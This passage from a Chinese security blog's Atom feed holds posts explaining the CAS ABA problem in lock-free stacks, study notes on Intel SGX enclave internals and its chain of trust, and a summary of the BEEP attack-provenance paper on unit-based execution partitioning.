    <category term="golang" scheme="https://cl0und.xyz/tags/golang/"/>
    
  </entry>
  
  <entry>
    <title>与AI纸上谈兵-CAS的ABA问题</title>
    <link href="https://cl0und.xyz/2025/01/04/%E4%B8%8EAI%E7%BA%B8%E4%B8%8A%E8%B0%88%E5%85%B5-CAS%E7%9A%84ABA%E9%97%AE%E9%A2%98/"/>
    <id>https://cl0und.xyz/2025/01/04/%E4%B8%8EAI%E7%BA%B8%E4%B8%8A%E8%B0%88%E5%85%B5-CAS%E7%9A%84ABA%E9%97%AE%E9%A2%98/</id>
    <published>2025-01-04T03:39:17.000Z</published>
    <updated>2025-01-04T03:48:23.652Z</updated>
    
    <content type="html"><![CDATA[<h1>CAS</h1><blockquote><p><code>CAS</code>即<code>Compare And Swap</code>的缩写，翻译成中文就是 <strong>比较并交换</strong> ，其作用是让CPU比较内存中某个值是否和预期的值相同，如果相同则将这个值更新为新值，不相同则不做更新，也就是CAS是<strong>原子性</strong>的操作(读和写两者同时具有原子性)，其实现方式是通过借助<code>C/C++</code>调用CPU指令完成的，所以效率很高。</p></blockquote><h1>用CAS来实现一个无锁栈</h1><p>设想我们实现了一个无锁栈，用链表节点表示栈中的元素，其中<code>top</code>指针指向栈顶元素。为了实现高效和线程安全的出栈操作，我们使用CAS更新<code>top</code>指针。一个典型的出栈伪代码可能是以下形式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">pop</span>(<span class="params"></span>) &#123;  </span><br><span class="line">    <span class="keyword">do</span> &#123;  </span><br><span class="line">        oldTop = top  <span class="comment">// 获取当前栈顶节点  </span></span><br><span class="line">        <span class="keyword">if</span> (oldTop == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>  <span class="comment">// 栈为空  </span></span><br><span class="line">        &#125;  </span><br><span class="line">        newTop = oldTop.<span class="property">next</span>  <span class="comment">// 栈顶将被移除，新的栈顶是下一个  </span></span><br><span class="line">    &#125; <span class="keyword">while</span> (!<span class="title function_">compare_and_swap</span>(top, oldTop, newTop))  <span class="comment">// CAS操作，尝试更新栈顶  </span></span><br><span class="line">    <span class="keyword">return</span> oldTop.<span class="property">value</span>  <span class="comment">// 返回栈顶的值  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>ABA问题-在无锁栈中</h1><p>假设以下线程和操作按顺序发生：</p><ol><li>线程A：调用<code>pop</code>，读取<code>oldTop</code>，其值是节点A。</li><li>线程B：调用两次<code>pop</code>，依次移除了节点A和节点B，并随后将节点A重新压回栈（通过<code>push</code>操作），此时栈的<code>top</code>再次指向节点A。</li><li>线程A：继续执行刚才的CAS操作，发现<code>top</code>的值仍然是节点A（因为线程B又将节点A压回栈），CAS 操作通过。</li></ol><p>看似 CAS 成功了，但线程A并不知道，栈的结构已经在它检查<code>oldTop</code>和执行CAS之间发生了改变。此时<strong>返回的节点A</strong>可能已经不再安全使用，因为它的状态已经被修改，或者栈本身的数据结构可能已经遭到破坏。</p><h1>ABA问题-在“生活”中</h1><p>小明在提款机，提取了50元，因为提款机问题，有两个线程，同时把余额从100变为50</p><p>线程1（提款机）：获取当前值100，期望更新为50，</p><p>线程2（提款机）：获取当前值100，期望更新为50，</p><p>线程1成功执行，线程2某种原因block了，这时，某人给小明汇款50</p><p>线程3（默认）：获取当前值50，期望更新为100，</p><p>这时候线程3成功执行，余额变为100，</p><p>线程2从Block中恢复，获取到的也是100，compare之后，继续更新余额为50！！！</p><p>此时可以看到，实际余额应该为100（100-50+50），但是实际上变为了50（100-50+50-50）这就是ABA问题带来的成功提交。</p><h1>ABA问题的解决</h1><p>在变量前面加上版本号，每次变量更新的时候变量的 <strong>版本号都</strong> <code>+1</code>，即<code>A-&gt;B-&gt;A</code>就变成了<code>1A-&gt;2B-&gt;3A</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>&lt;T&gt; &#123;  </span><br><span class="line">    T value;  </span><br><span class="line">    Node&lt;T&gt; next;  </span><br><span class="line">    <span class="type">long</span> version; <span class="comment">// 添加版本号字段  </span></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VersionedReference</span>&lt;T&gt; &#123;  </span><br><span class="line">    Node&lt;T&gt; reference;  </span><br><span class="line">    <span class="type">long</span> version;  </span><br><span class="line">  </span><br><span class="line">    VersionedReference(Node&lt;T&gt; ref, <span class="type">long</span> ver) &#123;  </span><br><span class="line">        reference = ref;  </span><br><span class="line">        version = ver;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">function <span class="title function_">pop</span><span class="params">()</span> &#123;  </span><br><span class="line">    VersionedReference&lt;T&gt; oldTop;  </span><br><span class="line">    Node&lt;T&gt; newTop;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">do</span> &#123;  </span><br><span class="line">        oldTop = top.get(); <span class="comment">// 获取当前的引用和版本号  </span></span><br><span class="line">        <span class="keyword">if</span> (oldTop.reference == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 栈为空  </span></span><br><span class="line">        &#125;  </span><br><span class="line">        newTop = oldTop.reference.next; <span class="comment">// 新的栈顶是下一个节点  </span></span><br><span class="line">      </span><br><span class="line">        <span class="comment">// CAS操作会同时比较引用和版本号  </span></span><br><span class="line">    &#125; <span class="keyword">while</span> (!top.compareAndSet(  </span><br><span class="line">        oldTop,  <span class="comment">// 期望的旧值(包含引用和版本号)  </span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">VersionedReference</span>(newTop, oldTop.version + <span class="number">1</span>)  <span class="comment">// 新值(更新引用和版本号)  </span></span><br><span class="line">    ));  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> oldTop.reference.value;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h1>什么是原语？</h1><blockquote><p>计算机是一门人造科学，因此真正意义上的“原语”是不存在的。操作系统层面上的“原语”（比如 write 之类的系统调用）对程序员来讲的确是不可分割的最小单位，但是这写系统调用本身还是用好几句汇编语句组成的（对于 Linux 来说是 C 语言）。可能有人要说到了机器代码这一级就不能再分了，但事实上一条机器指令也是由好几个组合逻辑信号构成的。同样的道理，控制信号也不过是无数电子在器件内部漂移的结果。</p><p>因此定义“原语”的前提是观察者所处的位置。一旦规定了观察者的位置和观察的角度，比如就在操作系统的这层上，read，wirte，wait这些个系统调用自然就是最“原始”的词汇，这也是为什么“原语”会在操作系统中频繁出现的缘故。</p></blockquote><h1>参考</h1><p><a href="https://www.cnblogs.com/hualalasummer/p/3704225.html">什么是“原语”</a></p><p><a href="https://juejin.cn/post/6844903796129136647">CAS原理分析及ABA问题详解</a></p><p>Claude 3.5 sonnet</p>]]></content>
    
    
    <summary type="html">Compare And Swap</summary>
    
    
    
    
    <category term="talking big" scheme="https://cl0und.xyz/tags/talking-big/"/>
    
  </entry>
  
  <entry>
    <title>Intel SGX（Software Guard Extensions）速记</title>
    <link href="https://cl0und.xyz/2024/12/01/Intel-SGX%EF%BC%88Software-Guard-Extensions%EF%BC%89%E9%80%9F%E8%AE%B0/"/>
    <id>https://cl0und.xyz/2024/12/01/Intel-SGX%EF%BC%88Software-Guard-Extensions%EF%BC%89%E9%80%9F%E8%AE%B0/</id>
    <published>2024-12-01T15:17:33.000Z</published>
    <updated>2024-12-01T15:30:12.888Z</updated>
    
    <content type="html"><![CDATA[<h1>SGX的作用</h1><blockquote><p>SGX使得应用程序在一段位于Enclave地址空间中能够开辟一段受保护的内存空间。这段受保护空间实行严格的访问控制和加密操作来提供对程序数据机密性和代码完整性的保护，使得即使是Hypervisor、BIOS，操作系统等特权应用都不能随意访问这段地址空间</p></blockquote><h1>SGX的启用</h1><blockquote><p>SGX support can be checked by executing the CPUID instruction with the <em>Structured Extended Feature Leaf</em> flag set, and checking if the second bit of the EBX register is set. To be able to use SGX, it must have been enabled by BIOS, and only a few BIOSes actually support this technology. That is one of the reasons it is not widely used.</p></blockquote><h1>Enclave</h1><p>在Intel SGX（Software Guard Extensions）中，Enclave是一个受硬件保护的安全执行环境（Trusted Execution Environment, TEE）。Enclave是一个运行环境的概念，但它也可以被视为一个程序实体的逻辑单元，因为它承载了特定的代码和数据，并在运行时提供隔离和保护。</p><p>程序在编译时会被被分为non-secure和secure part (运行在enclave中)。当调用enclave function时，程序会进入enclave环境，只有enclave中的代码可以访问enclave中数据。</p><p><img src="image1.png" alt=""></p><p><img src="image2.png" alt=""></p><p>一个代码的例子</p><p><img src="image3.png" alt=""></p><h1>INTEL SGX指令</h1><p>ring0支持左边8个指令，ring3支持右边五个指令。</p><p><img src="image4.png" alt=""></p><h1>内存中的关键概念</h1><p><img src="image5.png" alt=""></p><h2 id="PRM-Preserved-Random-Memory">PRM (Preserved Random Memory)</h2><ul><li>是DRAM中一段连续的保留内存区域</li><li>位于最低的BIOS层</li><li>不能被任何普通软件直接访问</li></ul><h2 id="EPC-Enclave-Page-Cache">EPC (Enclave Page Cache)</h2><ul><li>是PRM中的一部分</li><li>由操作系统负责分配</li><li>是4KB大小的内存页面组成的集合</li><li>用于存储Enclave的代码和数据</li><li>内存会被<em>Memory Encryption Engine</em>加密。只有在物理CPU中才会被解密。加密的密钥在boot time时被生成并存储在CPU中。</li></ul><p><img src="image6.png" alt=""></p><h2 id="EPCM-Enclave-Page-Cache-Map">EPCM  (Enclave Page Cache Map)</h2><ul><li>EPCM不存储在EPC或PRM中，EPCM是一个硬件级的数据结构。存储在处理器的专用存储区域中（例如，处理器内部的寄存器或缓存中）</li><li>EPCM在处理器内部，软件（ <strong>包括Enclave代码</strong> 、操作系统）都无法直接访问。</li><li>EPCM是一个硬件维护的表，用于记录EPC中每个页面的元数据（metadata）。</li><li>它跟踪EPC页面的分配状态、所属Enclave、页面类型（如代码页、数据页、TCS页等）以及访问权限。</li></ul><p>EPCM结构体</p><p><img src="image7.png" alt=""></p><ul><li><p>VALID：</p><ul><li>标志页面是否已分配。</li><li>如果为<code>0</code>，表示该页面未被分配。</li></ul></li><li><p>PT（Page Type）：</p><ul><li><p>指定页面的类型，例如：</p><ul><li><code>PT_REG</code>：普通数据或代码页面。</li><li><code>PT_SECS</code>：SECS页面。</li><li><code>PT_TCS</code>：线程控制结构（TCS）页面。</li></ul></li></ul></li><li><p>ENCLAVESECS：</p><ul><li>标识页面所属的Enclave。</li><li>确保页面只能被其所属的Enclave访问，防止跨Enclave的非法访问。</li></ul></li><li><p>ADDRESS：</p><ul><li>页面对应的虚拟地址，用于访问该页面。</li></ul></li><li><p>R/W/X（权限位）：</p><ul><li><p>控制页面的访问权限：</p><ul><li><code>R</code>：允许Enclave代码读取页面。</li><li><code>W</code>：允许Enclave代码写入页面。</li><li><code>X</code>：允许在页面中执行代码。</li></ul></li></ul></li></ul><p>单个PRM中只有一个EPC区域：</p><ul><li>PRM中的一部分被划分为EPC，用于存储Enclave的页面（代码和数据）。</li><li>EPC是一个连续的内存区域，其大小由硬件和BIOS配置决定（通常是128MB，但可能更小或更大，具体取决于处理器型号和系统配置）。</li><li>换句话说，PRM中只有一个EPC区域，而不是多个EPC。</li><li>多个Enclave的页面会被分配到同一个EPC区域中，但硬件确保它们之间的隔离和安全性。(EPCM确保)</li><li>每个Enclave需要占用一定数量的EPC页面。如果EPC空间不足，系统可能会通过SGX的换页机制（paging）将部分EPC页面换出到普通内存中。</li></ul><h2 id="SECS-SGX-Enclave-Control-Structure">SECS (SGX Enclave Control Structure)</h2><p><strong>一个Enclave对应一个SECS</strong></p><ul><li><p>SECS的作用：</p><ul><li><p>SECS是每个Enclave的核心元数据结构，存储了Enclave的关键信息，包括：</p><ul><li>密码学测度（Measurement）：用于认证Enclave的完整性。</li><li>Enclave的身份信息：如Enclave的创建参数、大小、属性等。</li></ul></li><li><p>SECS是EPC中的一个页面，但它受到严格的硬件保护， <strong>只有SGX硬件和微码可以访问和修改</strong> 。</p></li></ul></li><li><p>安全性要求：</p><ul><li>如果Enclave中的代码能够直接修改SECS中的数据（如密码学测度或身份信息），将破坏SGX的安全模型。</li><li>为此，SGX硬件通过EPCM中的权限控制字段，确保SECS页面只能由SGX硬件访问，而不能被Enclave代码或外部软件直接修改。</li></ul></li></ul><h2 id="TCS-Thread-Control-Structure">TCS (Thread Control Structure)</h2><p>和SECS一样，不能被其他软件包括enclave中的代码本省修改。一个enclave至少有一个，因为它为多线程而生，所以也可以有多个。</p><blockquote><p>The SGX design fully supports multi-core processors. It is possible for multiple logical processors to concurrently execute the same enclave’s code at the same time, via different threads.</p><p>The SGX implementation uses a Thread Control Structure (TCS) for each logical processor that executes an enclave’s code.</p></blockquote><h2 id="SSA-Save-State-Area">SSA(Save State Area)</h2><p>一个TCS至少有有一个SSA用于在线程因为中断或者异常退出时保存状态，在恢复时从这里面读取状态。</p><h2 id="Stack-and-Heap">Stack and Heap</h2><p>有自己的堆栈</p><p><img src="image8.png" alt=""></p><h1>Intel SGX信任根与信任链建立过程</h1><h2 id="一、硬件信任根初始化">一、硬件信任根初始化</h2><h3 id="1-Intel-SGX硬件密钥体系">1. Intel SGX硬件密钥体系</h3><ul><li><p>基础密钥(Root Provisioning Key和Root Seal Key)在制造时烧录到熔丝(Fuse)中</p></li><li><p>采用密钥派生机制(Key Derivation)生成其他功能密钥:</p><ul><li>Provisioning Key: 用于远程认证</li><li>Seal Key: 用于数据加密存储</li><li>Report Key: 用于本地报告签名</li><li>Launch Key: 用于Enclave启动控制</li></ul></li></ul><h3 id="2-SGX硬件可信模块">2. SGX硬件可信模块</h3><ul><li>测量引擎(Measurement Engine)</li><li>密钥派生引擎(Key Derivation Engine)</li><li>加密引擎(Encryption Engine)</li><li>签名验证引擎(Signature Verification Engine)</li><li>安全内存管理单元(Memory Management Unit)</li></ul><h2 id="二、Enclave创建与测量">二、Enclave创建与测量</h2><h3 id="1-Enclave代码准备">1. Enclave代码准备</h3><ul><li>开发者提供Enclave代码、数据和属性定义</li><li>属性包括:XFRM、MODE(DEBUG/PRODUCTION)等</li></ul><h3 id="2-硬件测量过程">2. 硬件测量过程</h3><ul><li>逐页测量:</li></ul><p>For each page:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MRENCLAVE <span class="operator">=</span> SHA256_UPDATE(MRENCLAVE <span class="operator">||</span>  PAGE_INFO <span class="operator">||</span> PAGE_CONTENT)</span><br></pre></td></tr></table></figure><ul><li><p>页信息(PAGE_INFO)包含:</p><ul><li>页类型(REG/TCS/SECS)</li><li>页属性(R/W/X权限)</li><li>加载偏移地址</li></ul></li><li><p>最终生成256位的MRENCLAVE值</p></li></ul><h2 id="三、签名验证-SIGSTRUCT">三、签名验证(SIGSTRUCT)</h2><h3 id="1-开发者签名">1. 开发者签名</h3><ul><li>使用2048位RSA密钥对生成SIGSTRUCT</li><li>SIGSTRUCT包含:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  MRENCLAVE,</span><br><span class="line">  Attributes,</span><br><span class="line">  ISVSVN,</span><br><span class="line">  ISVPRODID,</span><br><span class="line">  DATE,</span><br><span class="line">  SIGNATURE </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-MRSIGNER生成">2. MRSIGNER生成</h3><ul><li>MRSIGNER = SHA256(RSA Public Key Modulus)</li><li>用于识别Enclave开发者身份</li></ul><h3 id="3-硬件验证">3. 硬件验证</h3><ul><li>验证RSA签名有效性</li><li>验证MRENCLAVE匹配</li><li>验证属性合法性</li></ul><h2 id="四、启动授权-EINITTOKEN">四、启动授权(EINITTOKEN)</h2><h3 id="1-Launch-Enclave职责">1. Launch Enclave职责</h3><ul><li>实现Intel定义的启动控制策略</li><li>管理Enclave白名单</li><li>生成并签署EINITTOKEN</li></ul><h3 id="2-EINITTOKEN结构">2. EINITTOKEN结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  MRENCLAVE,</span><br><span class="line">  MRSIGNER,</span><br><span class="line">  Attributes,</span><br><span class="line">  ISVSVN,</span><br><span class="line">  CPUSVN,</span><br><span class="line">  KEYID,</span><br><span class="line">  MAC  // 使用Launch Key计算的MAC</span><br><span class="line">&#125;=</span><br></pre></td></tr></table></figure><h3 id="3-授权流程">3. 授权流程</h3><ol><li>验证请求者身份(MRSIGNER)</li><li>检查启动策略合规性</li><li>使用Launch Key生成MAC</li><li>打包EINITTOKEN</li></ol><h2 id="五、Enclave初始化-EINIT">五、Enclave初始化(EINIT)</h2><h3 id="1-硬件验证">1. 硬件验证</h3><ul><li>验证EINITTOKEN的MAC</li><li>验证MRENCLAVE/MRSIGNER匹配</li><li>检查属性与策略符合性</li></ul><h3 id="2-初始化过程">2. 初始化过程</h3><ul><li>建立Enclave上下文</li><li>初始化TCS(Thread Control Structure)</li><li>设置内存访问权限</li><li>生成Enclave加密密钥</li></ul><h3 id="3-信任链确立">3. 信任链确立</h3><ul><li>硬件信任根 → 测量值 → 开发者签名 → 启动授权 → 运行时隔离</li></ul><p>这样的修改更准确地描述了SGX的信任根和信任链建立过程,包含了关键的技术细节。您觉得还有需要补充或修改的地方吗?</p><h1>防止不可信的OS地址映射攻击</h1><p>OS会被视作不可信环境，需要防止恶意的OS修改VA到PA的映射。</p><ol><li><p>The CPU performs the usual virtual-to-physical address translation using the page tables (controlled by the untrusted OS).</p></li><li><p>Once the physical address is determined, the CPU checks whether the physical address belongs to an EPC page by consulting the EPCM.</p></li><li><p>If the physical address is an EPC page, the CPU compares the virtual address being accessed with the expected virtual address stored in the EPCM entry for that EPC page.</p><ol><li>If the virtual address matches, the access is allowed.</li><li>If the virtual address does not match, the CPU raises an exception, and the access is denied.</li></ol></li></ol><h1>Enclave的调度</h1><p><img src="image9.png" alt=""></p><p>留给操作系统调度的指令</p><p><strong>EPA</strong> - This instruction allocates a 4KB memory page that will contain the pages version number array (VA) to protect against replay. Each element is 64 bits long.</p><p><strong>EBLOCK</strong> - This instruction blocks all accesses to the page being prepared for eviction. All future accesses to this page will result in a page fault (“page blocked”).</p><p><strong>ETRACK</strong> - This instruction evicts a page from the EPC. The page must have been prepared properly: it must be blocked and must not be referenced by the TLB. Before writing it into the external memory, the page is encrypted, and a version number and meta-data are generated, and a final MAC is performed.</p><p><strong>ELDB/ELDU</strong> - This instruction loads into memory a previously evicted page, in a blocked state or not. It checks the MAC of the meta-data, version number (from the corresponding VA entry), and the page encrypted content. If the verification succeeds, the page content is decrypted and placed inside the chosen EPC page, and the corresponding VA entry deleted.</p><h1>Enclave的创建</h1><p><img src="image10.png" alt=""></p><h1>Enclave的进入和退出</h1><p><img src="image11.png" alt=""></p><h1>Enclave中断和恢复</h1><p><img src="image12.png" alt=""></p><h1>Intel SGX的原生支持缺陷</h1><p>SGX 的原生接口（如 ECALL 和 OCALL）非常底层，无法直接支持复杂的 OS 抽象。例如，线程管理、同步原语和动态线程创建在 SGX 中没有直接支持。</p><p><img src="image13.png" alt=""></p><p>也不支持enclave之间通信。</p><p><img src="image14.png" alt=""></p><h1>参考</h1><p><a href="https://lingering.github.io/2020/06/18/SGX-%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/">https://lingering.github.io/2020/06/18/SGX-基本原理/</a></p><p><a href="https://blog.quarkslab.com/overview-of-intel-sgx-part-1-sgx-internals.html">https://blog.quarkslab.com/overview-of-intel-sgx-part-1-sgx-internals.html</a></p><p><a href="https://blog.quarkslab.com/overview-of-intel-sgx-part-2-sgx-externals.html">https://blog.quarkslab.com/overview-of-intel-sgx-part-2-sgx-externals.html</a></p><p><a href="https://www.ndss-symposium.org/wp-content/uploads/2017/09/ndss2017_07-5_Shinde_paper.pdf">https://www.ndss-symposium.org/wp-content/uploads/2017/09/ndss2017_07-5_Shinde_paper.pdf</a></p><p><a href="https://sgx101.gitbook.io/sgx101/sgx-bootstrap/enclave">https://sgx101.gitbook.io/sgx101/sgx-bootstrap/enclave</a></p>]]></content>
    
    
    <summary type="html">homework驱动学习</summary>
    
    
    
    <category term="binary" scheme="https://cl0und.xyz/categories/binary/"/>
    
    
    <category term="paper reading" scheme="https://cl0und.xyz/tags/paper-reading/"/>
    
    <category term="binary" scheme="https://cl0und.xyz/tags/binary/"/>
    
  </entry>
  
  <entry>
    <title>APT溯源图构建-论文阅读第二篇-BEEP-High Accuracy Attack Provenance via Binary-based Execution Partition</title>
    <link href="https://cl0und.xyz/2024/10/09/APT%E6%BA%AF%E6%BA%90%E5%9B%BE%E6%9E%84%E5%BB%BA-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%AC%E4%BA%8C%E7%AF%87-BEEP-High-Accuracy-Attack-Provenance-via-Binary-based-Execution-Partition/"/>
    <id>https://cl0und.xyz/2024/10/09/APT%E6%BA%AF%E6%BA%90%E5%9B%BE%E6%9E%84%E5%BB%BA-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%AC%E4%BA%8C%E7%AF%87-BEEP-High-Accuracy-Attack-Provenance-via-Binary-based-Execution-Partition/</id>
    <published>2024-10-09T14:05:20.000Z</published>
    <updated>2024-10-09T14:08:23.449Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Overview">Overview</h2><p>这篇文章是19年的时候作者觉得现在基于syscall的日志粒度太粗糙了，可能引起路径爆炸的问题，所以提出了一个unit的概念用来精细化。</p><p>为什么粗糙？</p><p>其实只要是一些长时间跑的程序会有，比如浏览器，比如email软件。</p><p><img src="image1.png" alt=""></p><p>比如一天一个人会收到无数封邮件，其中有一封是钓鱼邮件，这个受害者使用Pine（一个文本基的电子邮件客户端）触发firefox打开钓鱼邮件里面恶意链接之后，中了木马。</p><p>因为邮件程序和firefox程序都是在长时间运行，所以一旦出了问题难以溯源，究竟是哪一封邮件，触发哪一个钓鱼IP导致的问题。</p><h2 id="Existing-Heuristics-method">Existing Heuristics method</h2><p>一些现有的解决这个问题的方法是</p><ol><li>使用时间戳来关联到近似的精准的因果关系 -&gt; 显然者并不是一个优雅的方法</li><li>既然一个程序（进程）粒度太粗了那就切分到线程级别来做 -&gt; 但是一些程序是用线程池的，仍然会造成因果混乱。</li><li>从file segment的角度关联，只有读了同一个文件指定segment才关联到一起。-&gt; 显然也不优雅，如果两个不相关的进程恰好整体读了文件，也会有错误因果关系。</li></ol><h2 id="Insight">Insight</h2><p>作者观察到这种长时间运行的程序都会有loop的特征。所以作者把每一次循环都看作是一个unit，然后关联unit之间的关系。做到细粒度的关联。</p><p>并且作者观察到这种loop特征的长时间运行程序基本都是事件驱动类型的。</p><p>作者把他们分成了三种pattern</p><ol><li>Single-process 比如W3M</li><li>Multiprocess 比如SSH直接fork一个新进程。</li><li>multi-threaded, respectively 比如apache http server, 两个线程，一个线程“生产”，一个线程“消费”</li></ol><p><img src="image2.png" alt=""></p><ol><li>每一次循环可以看成一个独立的子执行一个unit</li><li>子进程没有loop，所以子进程看成一个unit</li><li>把生产者的一次循环和对应触发的消费者的那一次循环看成两个unit</li></ol><p>如3这种比较复杂的需要找到unit之间的依赖关系，如果这种loop是被系统事件驱动很好找，因为监控系统调用就行了比如socket/file。</p><p>但是对于一些不是由系统event触发的loop，就需要考察是enqueue和dequeue进行插桩关联。</p><h2 id="识别unit">识别unit</h2><p>作者先是放弃了静态分析的方法，因为静态分析总是不精确的（参考莱斯定理哈哈）。</p><p>首先作者总结了包含unit的loop的特征</p><ol><li>这样的loop一般会倾向于出现在顶层</li><li>这样的loop一般会有一个syscall产生输入后或者输出</li></ol><p>但是这个特征并不精确，作者观察到有一些init和finailize的逻辑也会在顶层循环中，并且他发现在第二级loop中的逻辑才是我们想要找的unit。比如他们研究pine的时候发现的例子。</p><p><img src="image3.png" alt=""></p><p><img src="image4.png" alt=""></p><p>所以为了容忍这种情况，作者用tranning的方法对top level和second level的loop进行排查。</p><p>这个trainning的具体做法是</p><blockquote><p>In the training phase, our technique first constructs control flow graphs and call graphs for subject binaries using PEBIL [21], to identify loop heads and exits. Then we perform dynamic instrumentation using PIN [23] to log the beginning and ending of each iteration of all loops and system calls. We analyze the generated training log to filter out those loops that nest too deep or do not involve input/output syscalls.</p></blockquote><p>然后作者在后面说他把细节省略，但是我其实挺想看这些工程化细节的。。。</p><p><img src="image5.png" alt=""></p><p>这三列就是作者分别识别出来的，这程序总共有多少个loop，第一二季有多少loop，包含syscall有多少loop</p><h2 id="关联unit">关联unit</h2><p>捕获单元间的依赖关系对于隔离由多个单元构成的语义独立子执行是非常重要的。</p><p>这里基本思路是改进版的访问同一块内存。作者这里定义了两种类型的unit依赖</p><ul><li>Low Level Dependence：比如一些日志或者内存的管理，或者一个程序要通过更新全局变量的方式向另一个方报告自己的状态etc。这些东西可能导致最终把所有的unit都关联起来。</li><li>Workflow Dependence：这两个unit有明确的工作流关系</li></ul><p><img src="image6.png" alt=""></p><p>比如这里实线是Workflow Dependence，Low Level Dependence是虚线由update(log_buf)导致。</p><p>所以作者这里又加两个规则（为了拿到workflow dependence）</p><ol><li>两个有workflow dependence关系unit共享heap object的变量，而不是全局变量或者栈变量</li><li>来自同一个loop的unit都会有不同对象比如socket_A，socket_b，socket_c，但是像log_buf都是大家都有。</li></ol><p>作者下面给了一个算法来自动化的寻找unit</p><ol><li>We instrument libc memory allocation functions to detect all heap objects and their sizes.</li><li>We instrument all memory accesses to check if an access targets on any of the allocated heap objects. If so, we log the access.</li><li>We instrument all the unit loops identified in the previous phase to log the begin and the end of a unit. Essentially, we log each instance of a unit loop head. The execution between two consecutive instances of the loop head denotes a unit.</li><li>We then associate all the heap objects to the units in which they are accessed. For a heap access instruction inside a unit loop, if it accesses unique heap objects in different units and these objects cause inter-unit dependences, we consider it a unit dependence inducing instruction.* In other words, if an instruction ever accesses the same heap object in multiple units, it is excluded; if the object accessed by an instruction can never cause cross-unit dependence, it is excluded.*</li></ol><p><img src="image7.png" alt=""></p><p>在这个例子中算法会排除0x1,0x10 etc,因为他们在多个unit中都用到了，而0x10001只被两个unit共享所以会被看成有workflow dependence。0x20001同理。</p><p>后面作者又优化了一下这种算法，因为他发现我在两个有workflow dependence的unit里面，比如unit1-1 unit2-1</p><p>unit1-1写入0x50000, 0x50010。然后unit2-1读取0x50000, 0x50010。他们都会建立两次关系，但其实可能只是读了一个结构体的不同field，作者觉得unit1-1的写和unit2-1的读总是对称的。所以只选第一个field建立一次关系。</p><p>评论：但是我不懂作者是如何做到这一点的，怎么判断是不是同一个结构体的field？通过插桩的记录的chunk起始地址和大小？</p><p>后面还有一些其他的内容，比如作者提到动态测试覆盖不全可能会miss loop，或者上面规则不够完备还是可能关联上low level的dependence进来，最后还给了建立provence的算法。不过我觉得精华都在unit在这部分。</p>]]></content>
    
    
    <summary type="html">第二篇BEEP-High Accuracy Attack Provenance via Binary-based</summary>
    
    
    
    <category term="redteam" scheme="https://cl0und.xyz/categories/redteam/"/>
    
    
    <category term="paper reading" scheme="https://cl0und.xyz/tags/paper-reading/"/>
    
    <category term="redteam" scheme="https://cl0und.xyz/tags/redteam/"/>
    
  </entry>
  
  <entry>
    <title>APT溯源图构建-论文阅读第一篇-HOLMES: Real-time APT Detection through Correlation of Suspicious Information Flows</title>
    <link href="https://cl0und.xyz/2024/10/05/APT%E6%BA%AF%E6%BA%90%E5%9B%BE%E6%9E%84%E5%BB%BA-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%AC%E4%B8%80%E7%AF%87-HOLMES-Real-time-APT-Detection-through-Correlation-of-Suspicious-Information-Flows/"/>
    <id>https://cl0und.xyz/2024/10/05/APT%E6%BA%AF%E6%BA%90%E5%9B%BE%E6%9E%84%E5%BB%BA-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%AC%E4%B8%80%E7%AF%87-HOLMES-Real-time-APT-Detection-through-Correlation-of-Suspicious-Information-Flows/</id>
    <published>2024-10-05T15:03:48.000Z</published>
    <updated>2024-10-05T15:22:01.148Z</updated>
    
